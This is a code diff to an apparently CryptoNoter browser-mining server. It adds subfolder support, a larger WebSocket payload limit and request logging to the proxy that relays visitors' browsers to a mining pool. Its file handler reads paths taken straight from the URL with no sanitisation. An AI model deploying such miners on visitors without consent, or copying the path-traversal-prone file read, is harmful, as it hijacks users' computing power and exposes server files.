@@ -22,6 +22,7 @@ if (fs.existsSync(__dirname + '/config.json')) {
 //heroku port
 conf.lport = process.env.PORT || conf.lport;
 conf.domain = process.env.DOMAIN || conf.domain;
+conf.subfolder = process.env.SUBFOLDER || conf.subfolder;
 conf.key = process.env.KEY || conf.key;
 conf.cert = process.env.CERT || conf.cert;
 conf.pool = process.env.POOL || conf.pool;
@@ -31,7 +32,7 @@ conf.pass = process.env.PASS || conf.pass;
 if (!conf.lport) {
   console.error("Port (lport) needs to be defined in the config or via environment variable (PORT)");
   process.exit(1);
-};
+}
 
 if (!conf.domain) {
   console.error("Domain (domain) needs to be defined in the config or via environment variable (DOMAIN)");
@@ -48,17 +49,25 @@ if (!conf.addr) {
   process.exit(1);
 }
 
+conf.subfolder = conf.subfolder.replace(/^\/|\/$/g, '') + '/';
+
 //ssl support
 const ssl = !!(conf.key && conf.cert);
 
 const stats = (req, res) => {
-    req.url = (req.url === '/') ? '/index.html' : req.url;
+    req.url = (req.url.endsWith(conf.subfolder)) ? conf.subfolder + 'index.html' : req.url;
+    console.log(req.url);
+
     fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
         if (err) {
-		console.error(err);
+		console.log(err);
 	} else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
-                buf = buf.toString().replace(/%CryptoNoter_domain%/g, conf.domain);
+		if (conf.subfolder === '/') {
+			buf = buf.toString().replace(/%CryptoNoter_domain%/g, conf.domain);
+		} else {
+                	buf = buf.toString().replace(/%CryptoNoter_domain%/g, conf.domain + '/' + conf.subfolder.replace(/\/$/, ''));
+		}
                 if (req.url.match(/\.js$/)) {
                     res.setHeader('content-type', 'application/javascript');
                 }
@@ -83,8 +92,8 @@ if (ssl) {
 // Miner Proxy Srv
 var srv = new WebSocket.Server({
     server: web,
-    path: "/proxy",
-    maxPayload: 256
+    path: (conf.subfolder === '/') ? "/proxy" : "/" + conf.subfolder + "proxy",
+    maxPayload: 512
 });
 srv.on('connection', (ws) => {
     var conn = {
@@ -101,6 +110,7 @@ srv.on('connection', (ws) => {
 
     // Trans WebSocket to PoolSocket
     function ws2pool(data) {
+	console.log(data);
         var buf;
         data = JSON.parse(data);
         switch (data.type) {
